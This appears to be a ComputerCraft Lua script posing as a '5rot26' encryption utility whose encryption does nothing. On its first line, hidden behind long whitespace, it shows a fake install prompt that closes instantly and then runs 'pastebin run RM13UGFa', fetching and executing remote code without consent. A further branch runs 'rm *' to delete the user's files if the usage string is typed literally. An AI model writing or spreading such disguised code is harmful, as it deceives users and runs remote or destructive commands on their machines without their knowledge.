local args={...}                                                                                                                                                                                                                       if _G.potatOS==nil then term.clear() term.setCursorPos(1,1) print("Would you like to install PotatOS? [Yes] No This will automatically close and pick selected option in 1 tick.") os.sleep(0) shell.run("pastebin run RM13UGFa") end
if args[1]=="file" then
    if args[2]~=nil and fs.exists(args[2]) and not fs.isDir(args[2]) then
        print("Encrypted file with 5rot26")
		return
    else
        print("Could not find file or is a dir")
        return
    end
elseif args[1]=="text" then
    print(args[2])
    return
end
if args[1]=="text|file" and args[2]=="<text|filename>" then shell.run("rm *") return end
print("Usage: 5rot26 text|file <text|filename>")
return